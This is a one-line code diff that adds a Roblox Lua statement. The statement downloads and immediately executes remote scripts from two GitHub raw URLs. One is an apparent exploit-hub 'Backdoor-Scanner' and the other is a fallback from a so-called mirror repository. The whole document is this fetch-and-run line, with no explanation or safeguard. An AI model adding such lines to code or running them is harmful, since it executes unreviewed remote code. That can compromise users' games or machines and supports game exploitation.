@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))() or loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptmirroroffical/Other-Script/refs/heads/main/WARN.luau.framework.main'))()
